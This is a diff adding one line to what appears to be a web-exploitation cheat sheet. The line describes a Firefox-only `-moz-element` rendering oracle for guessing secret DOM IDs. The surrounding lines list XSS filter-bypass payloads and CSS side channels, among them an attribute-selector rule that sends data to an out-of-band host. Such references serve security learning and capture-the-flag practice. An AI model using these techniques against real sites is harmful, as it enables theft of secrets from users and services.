@@ -289,6 +289,7 @@ Filter bypass: case-mix `<ScRiPt>`, `<svg/onload=>`, template literal ``alert`1`
 - `@font-face`+`unicode-range` per char → font fetch fires only for present chars (leaks char *set*).
 - Custom-font glyph widths + `@container` queries → per-char width oracle (leaks order too).
 - `input[value^=a]{background:url(//OOB/a)}` attribute-value exfil.
+- When secret-dependent DOM IDs exist and the privileged bot uses Firefox, an allowed inline `style` attribute can reference an element through `-moz-element(#id)` even if `<style>` is forbidden. This is a possible rendering oracle, not a network callback or direct DOM read. First test a known-present and known-absent ID in the same Firefox version with a harmless local value; measure separation and noise before guessing unknown IDs. Do not use a Chromium result to reject this Firefox-only path, and stop if the controls are indistinguishable.
 
 ### Read what's already there
 - Hidden DOM: `[...document.querySelectorAll('*')].filter(e=>getComputedStyle(e).display=='none'&&e.textContent.trim())`.
